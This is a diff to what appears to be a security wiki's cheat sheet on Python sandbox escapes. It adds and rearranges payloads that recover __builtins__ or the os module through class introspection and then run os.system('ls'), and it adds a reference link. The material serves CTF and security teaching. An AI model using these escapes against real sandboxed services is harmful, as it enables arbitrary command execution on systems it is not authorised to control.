@@ -153,10 +153,6 @@ import __builtin__
 # Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")
 
-# Or you could recover __builtins__ in make eveything easier
-__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
-__builtins__["__import__"]('os').system('ls')
-
 # Or you could obtain the builtins from a defined function
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
@@ -166,6 +162,17 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```python
 # Obtain the builtins from a defined function
 get_flag.__globals__['__builtins__'].__import__("os").system("ls")
+
+# The os._wrap_close class is usually loaded. Its scope gives direct access to os package (as well as __builtins__)
+[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close' ][0]['system']('ls')
+```
+
+#### Python2 and Python3
+
+```python
+# Recover __builtins__ and make eveything easier
+__builtins__=([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__)
+__builtins__["__import__"]('os').system('ls')
 ```
 
 ### Finding types
@@ -294,6 +301,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 * [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
 * [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
 * [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
+* [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 
 \*\*\*\*
 
